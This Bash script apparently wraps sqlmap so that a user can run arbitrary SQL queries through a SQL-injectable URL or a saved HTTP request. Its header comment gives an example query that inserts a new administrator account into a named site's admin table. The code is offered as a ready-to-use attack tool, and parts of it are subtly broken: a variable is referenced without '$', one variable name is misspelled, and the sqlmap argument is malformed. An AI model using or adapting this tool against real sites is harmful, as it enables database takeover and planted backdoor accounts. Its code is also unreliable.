# url like 		http://www.cobranet.org/about.php?id=1
# query like    	INSERT INTO `cobranetdb`.`site_admins` (admin_password,admin_username) VALUES ('gersy','gersy')
# file path like 	/usr/bin/myhttpreq.txt
# Default Color \e[39m
# green \e[32m
# blue \e[34m
# yellow \e[33m
clear

#initalizing default values
attack_type="url"
file_path=""
url=""
sqlmap_query=""
batch="--batch"
com="Yes"

echo -e "\e[33m-------------------------------------------"
echo -e "\e[33m------SqlMap Query Executer ---------------"
echo -e "\e[33m------By http://twitter.com/YasserGersy ---"
echo -e "\e[33m___________________________________________"


echo -e "\e[39m Attack (url/file) Defualt'URL'"
read attack_type
attack_type=${attack_type,,} #to lower 

if [ $attack_type == "file"  ]
then 
	echo ""
	echo "Enter File path"
	read  file_path
	if [ -f file_path ]
		then 
			echo ""
			echo -e "\e[32m File existed" 
			sqlmap_query=" -r "$file_path
		else 
			echo "" 
			echo -e "\e[1m \e[31m File not existed \e[0m"
			exit
		fi
else	
	echo ""
	echo "Enter Infected url 'ex:http://vuln.com/l.php?id=4'"
	read url
	sqlmap_query=" -u "$url

	regex='(https?|ftp|file)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
	if [[ $url =~ $regex ]]
		then 
    			echo -e "\e[32m URL valid"
		else
    			echo -e "\e[1m \e[31m Invalid URL \e[0m"
			exit
	fi	

fi 
echo ""
echo -e "\e[39m Enter query :"
read query


echo ""
echo "Sqlmap Auto complete (yes\no)"
read batch_statue
batch_statue=${batch_statue,,}



echo -e "\e[33m___________________________________________"
if [ $attack_type == "file"  ]
	then 
		echo -e "\e[39m Attacking From File \e[34m{" $fil_path "}\e[39m"
	else
		echo -e "\e[39m Attacking   url     \e[34m{" $url "}\e[39m"
				
fi
echo "---------------------"
echo -e "\e[39m Your query is       \e[34m {" $query "} \e[39m"
echo "---------------------"


if [ $batch_statue == "no" ]
	then 
 	batch=""
	echo -e "\e[39m Auto Complete    \e[31m {No} \e[39m"
else  
	echo -e "\e[39m Auto Complete    \e[34m {Yes} \e[39m"

 fi




echo -e "\e[33m___________________________________________"
echo -e "\e[34m Proceed (yes or no )"
read confirm

confirm=${confirm,,} 
if [ $confirm == "no" ]
	then 
		echo -e "\e[1m \e[31m Aborted by user \e[0m"
		exit
	fi



###############
#echo "replacer"

#echo $query |replace "'" "\'"

 
#echo $query |replace '"' '\"'

###############

echo ""
echo  -e  "\e[32m Exeucting {sqlmap $sqlmap_query  --sql-query =\"$query\" $batch}"
 

echo -e "\e[33m___________________________________________"

sqlmap $sqlmap_query  --sql-query = \"$query\" $batch

